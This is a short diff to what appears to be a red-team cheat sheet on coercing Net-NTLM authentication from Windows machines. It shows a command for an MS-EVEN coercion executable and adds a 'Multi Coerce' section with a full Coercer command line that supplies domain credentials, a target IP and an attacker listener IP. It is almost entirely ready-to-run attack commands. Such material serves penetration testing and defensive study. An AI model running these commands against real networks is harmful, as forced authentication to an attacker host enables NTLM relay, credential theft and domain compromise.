@@ -21,3 +21,11 @@ Exploits to coerce Net-NTLM authentication from a computer. PetitPotam can be us
 ##### CheeseOunce via MS-EVEN
 
     ./MS-EVEN.exe <listener_IP> <target_IP>
+
+# Multi Coerce
+
+Try all the techniques above in one command with this.
+
+https://github.com/p0dalirius/Coercer
+
+    coercer.py coerce -u user1 -p password -d domain.local -t <target_IP> -l <attacker_IP> -v
